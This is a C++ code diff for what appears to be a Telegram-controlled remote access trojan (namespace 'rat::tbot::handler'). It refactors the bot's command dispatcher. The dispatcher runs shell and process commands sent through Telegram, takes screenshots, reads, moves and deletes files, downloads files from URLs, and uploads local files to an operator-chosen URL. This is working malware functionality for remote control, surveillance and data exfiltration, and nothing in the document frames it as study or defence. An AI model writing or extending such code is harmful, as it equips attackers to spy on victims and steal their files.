@@ -9,21 +9,22 @@ namespace rat::tbot::handler {
 
 
 static uint16_t __stringToUint16(const std::string& str);
-static  std::string _handlePwdCommand(void);
-static  std::string _handleCdCommand(const Command& arg_Command);
-static  std::string _handleLsCommand(const Command& arg_Command);
-static  std::string _handleReadCommand(const Command& arg_Command);
-static  std::string _handleTouchCommand(const Command& arg_Command);
-static  std::string _handleGetCommand(const Bot& arg_Bot, const Command& arg_Command);
-static std::string  _handleStatCommand(const Command& arg_Command);
-static std::string  _handleDownloadCommand(const Command& arg_Command);
-static std::string _handleUploadCommand(const Command& arg_Command);
+static std::string _handlePwdCommand(void);
+static std::string _handleCdCommand(const Command& arg_Command);
+static std::string _handleLsCommand(const Command& arg_Command);
+static std::string _handleReadCommand(const Command& arg_Command);
+static std::string _handleTouchCommand(const Command& arg_Command);
+static std::string _handleGetCommand(Bot& arg_Bot, const Command& arg_Command);
+static std::string _handleStatCommand(const Command& arg_Command);
 static std::string _handleRmCommand(const Command& arg_Command);
 static std::string _handleMvCommand(const Command& arg_Command);
 static std::string _handleCpCommand(const Command& arg_Command);
 static std::string _handleSetCommand(Bot& arg_Bot, const Command& arg_Command);
 
 static std::string _handleMessageWithUploadedFiles(const Message& Telegram_Message);
+
+static std::string _handleDownloadCommand(rat::networking::Client& Curl_Client, const Command& arg_Command);
+static std::string _handleUploadCommand(rat::networking::Client& Curl_Client ,const Command& arg_Command);
 
 
 // ---------- Main Command Dispatcher ----------
@@ -36,45 +37,17 @@ static std::string _handleCommand(Bot& arg_Bot, Message& Telegram_Message) {
 
     // Launch separate processes on detached threads
     if (strncmp(text, "/sh", 3) == 0) {
-        std::thread([&arg_Bot, telegram_message = Telegram_Message]() mutable{
-            
-            std::string result = _parseAndHandleShellCommand(telegram_message);
-            // debug output
-            std::cout << "[DEBUG] /sh command completed: " << result << "\n";
-            arg_Bot.sendMessage(result);
-        }).detach();
-        return "Executing shell command asynchronously...";
-    }
-
-    if (strncmp(text, "/sys", 4) == 0) {
-        std::thread([&arg_Bot, msg = Telegram_Message]() mutable {
-            
-            std::string result = _parseAndHandleSystemCommand(arg_Bot, msg);
-            
-            arg_Bot.sendMessage(result);
-            DEBUG_LOG("/sys command completed: {}", result);
-
-        }).detach();
-        return "Executing system command asynchronously...";
+        return _parseAndHandleShellCommand(Telegram_Message);
     }
 
     if (strncmp(text, "/process", 8) == 0) {
-        std::thread([&arg_Bot, msg = Telegram_Message]() mutable {
-            
-            std::string result = _parseAndHandleProcessCommand(arg_Bot, msg);
-            
-            arg_Bot.sendMessage(result);
-            
-            DEBUG_LOG("/process command completed: {}", result);
-        }).detach();
-        return "Executing process command asynchronously...";
+        return _parseAndHandleProcessCommand(arg_Bot, Telegram_Message);
     }
-
     if (strncmp(text, "/screenshot", 11) == 0) {
-        std::thread([&arg_Bot]() mutable {
-            std::string result = _handleScreenshotCommand(arg_Bot);
-            arg_Bot.sendMessage(result);
-            DEBUG_LOG("[DEBUG] /screenshot command completed");
+        std::thread([bot_copy = arg_Bot]() mutable {
+            std::string result = _handleScreenshotCommand(bot_copy);
+            bot_copy.sendMessage(result);
+            DEBUG_LOG("/screenshot command completed");
         }).detach();
         return "Taking screenshot asynchronously...";
     }
@@ -83,35 +56,35 @@ static std::string _handleCommand(Bot& arg_Bot, Message& Telegram_Message) {
 
     // Asynchronous file commands using TinyProcess
     if (arg_Command.directive == "/download") {
-        std::thread([botCopy = arg_Bot, cmd = arg_Command]() mutable {
-            std::string result = _handleDownloadCommand(cmd);
-            botCopy.sendMessage(result);
+        std::thread([bot_copy = arg_Bot, cmd = arg_Command]() mutable {
+            std::string result = _handleDownloadCommand(bot_copy.curl_client, cmd);
+            bot_copy.sendMessage(result);
             DEBUG_LOG("/download command completed");
         }).detach();
         return "Downloading file asynchronously...";
     }
 
     if (arg_Command.directive == "/upload") {
-        std::thread([botCopy = arg_Bot, cmd = arg_Command]() mutable {
-            std::string result = _handleUploadCommand(cmd);
-            botCopy.sendMessage(result);
+        std::thread([bot_copy = arg_Bot, cmd = arg_Command]() mutable {
+            std::string result = _handleUploadCommand(bot_copy.curl_client, cmd);
+            bot_copy.sendMessage(result);
             DEBUG_LOG("/upload command completed");
         }).detach();
         return "Uploading file asynchronously...";
     }
 
     // Synchronous commands
-    if (arg_Command.directive == "/set") return         _handleSetCommand(arg_Bot, arg_Command);
-    if (arg_Command.directive == "/pwd") return         _handlePwdCommand();
-    if (arg_Command.directive == "/cd") return          _handleCdCommand(arg_Command);
-    if (arg_Command.directive == "/ls") return          _handleLsCommand(arg_Command);
-    if (arg_Command.directive == "/read") return        _handleReadCommand(arg_Command);
-    if (arg_Command.directive == "/touch") return       _handleTouchCommand(arg_Command);
-    if (arg_Command.directive == "/get") return         _handleGetCommand(arg_Bot, arg_Command);
-    if (arg_Command.directive == "/stat") return        _handleStatCommand(arg_Command);
-    if (arg_Command.directive == "/rm") return          _handleRmCommand(arg_Command);
-    if (arg_Command.directive == "/mv") return          _handleMvCommand(arg_Command);
-    if (arg_Command.directive == "/cp") return          _handleCpCommand(arg_Command);
+    if (arg_Command.directive == "/set") return  _handleSetCommand(arg_Bot, arg_Command);
+    if (arg_Command.directive == "/pwd") return  _handlePwdCommand();
+    if (arg_Command.directive == "/cd") return   _handleCdCommand(arg_Command);
+    if (arg_Command.directive == "/ls") return   _handleLsCommand(arg_Command);
+    if (arg_Command.directive == "/read") return _handleReadCommand(arg_Command);
+    if (arg_Command.directive == "/touch") return _handleTouchCommand(arg_Command);
+    if (arg_Command.directive == "/get") return  _handleGetCommand(arg_Bot, arg_Command);
+    if (arg_Command.directive == "/stat") return _handleStatCommand(arg_Command);
+    if (arg_Command.directive == "/rm") return   _handleRmCommand(arg_Command);
+    if (arg_Command.directive == "/mv") return   _handleMvCommand(arg_Command);
+    if (arg_Command.directive == "/cp") return   _handleCpCommand(arg_Command);
 
     return fmt::format("Unknown command: {}", arg_Command.directive);
 }
@@ -195,7 +168,7 @@ static std::string _handleTouchCommand(const Command& arg_Command) {
     }
     return response;
 }
-static  std::string _handleGetCommand(const Bot& arg_Bot, const Command& arg_Command) {
+static  std::string _handleGetCommand(Bot& arg_Bot, const Command& arg_Command) {
     if (arg_Command.parameters.empty()) return "No file specified";
     auto file_path = std::filesystem::path(arg_Command.parameters[0]);
     if (std::filesystem::exists(file_path)) {
@@ -220,7 +193,7 @@ static std::string _handleStatCommand(const Command& arg_Command) {
     );
 }
 
-static std::string _handleDownloadCommand(const Command& arg_Command) {
+static std::string _handleDownloadCommand(rat::networking::Client& Curl_Client, const Command& arg_Command) {
     if (arg_Command.parameters.empty()) return "Usage: /download <url> [path]";
     std::string url = arg_Command.parameters[0];
     std::filesystem::path file_path;
@@ -234,39 +207,26 @@ static std::string _handleDownloadCommand(const Command& arg_Command) {
         }
     }
 
-    auto networking_response = rat::networking::downloadFile(url, file_path);
-    switch (networking_response.status) {
-        case networking::NetworkingResponseStatus::SUCCESS: {
-            auto ms = std::chrono::duration_cast<std::chrono::milliseconds>(networking_response.duration).count();
-            return fmt::format("File: {} downloaded in {} ms", file_path.string(), ms);
-        }
-        case networking::NetworkingResponseStatus::FILE_CREATION_FAILURE:
-            return fmt::format("Failed to create file: {}", file_path.string());
-        case networking::NetworkingResponseStatus::CONNECTION_FAILURE:
-            return "Connection failure during download";
-        case networking::NetworkingResponseStatus::INVALID_URL:
-            return "Invalid URL";
-        default:
-            return "Unknown download error";
+    auto result = Curl_Client.download(url, file_path);
+    if(result) {
+        return fmt::format("File: {} downloaded", file_path.string() );
+    }else{
+        return "File failed to download";
     }
 }
 
-static std::string _handleUploadCommand(const Command& arg_Command) {
+
+static std::string _handleUploadCommand(rat::networking::Client& Curl_Client, const Command& arg_Command) {
     if (arg_Command.parameters.size() < 2) return "Usage: /upload <filepath> <url>";
     std::filesystem::path file_path = arg_Command.parameters[0];
     if (!std::filesystem::exists(file_path)) return "File not found";
     std::string url = arg_Command.parameters[1];
 
-    auto net_resp = rat::networking::uploadFile(file_path, url);
-    switch (net_resp.status) {
-        case networking::NetworkingResponseStatus::SUCCESS: {
-            auto ms = std::chrono::duration_cast<std::chrono::milliseconds>(net_resp.duration).count();
-            return fmt::format("Uploaded '{}' in {} ms", file_path.string(), ms);
-        }
-        case networking::NetworkingResponseStatus::CONNECTION_FAILURE:
-            return "Connection failure during upload";
-        default:
-            return "Upload failed";
+    bool result = Curl_Client.upload(file_path, url);
+    if(result) {
+        return fmt::format("Uploaded '{}' ", file_path.string());
+    }else{
+        return "Upload failed";
     }
 }
 
